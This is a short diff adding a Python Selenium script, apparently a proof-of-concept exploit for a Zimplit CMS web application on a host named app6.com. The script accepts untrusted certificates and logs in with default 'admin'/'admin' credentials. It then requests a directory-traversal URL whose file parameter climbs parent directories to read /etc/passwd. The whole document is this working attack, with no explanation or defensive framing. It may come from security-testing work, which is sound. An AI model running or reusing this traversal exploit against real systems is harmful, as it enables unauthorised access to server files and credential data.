@@ -1,0 +1,16 @@
+from selenium import webdriver
+
+profile = webdriver.FirefoxProfile()
+profile.accept_untrusted_certs = True
+driver = webdriver.Firefox(firefox_profile=profile)
+driver.maximize_window()
+
+driver.get('https://app6.com/zimplit.php')
+elem = driver.find_element_by_name("username")
+elem.send_keys('admin')
+elem = driver.find_element_by_name("password")
+elem.send_keys('admin')
+button = driver.find_element_by_xpath('//input[@type="submit"]')
+button.click()
+driver.get('https://app6.com/zimplit.php?action=load1&file=../../../../../../../../../etc/passwd')
+
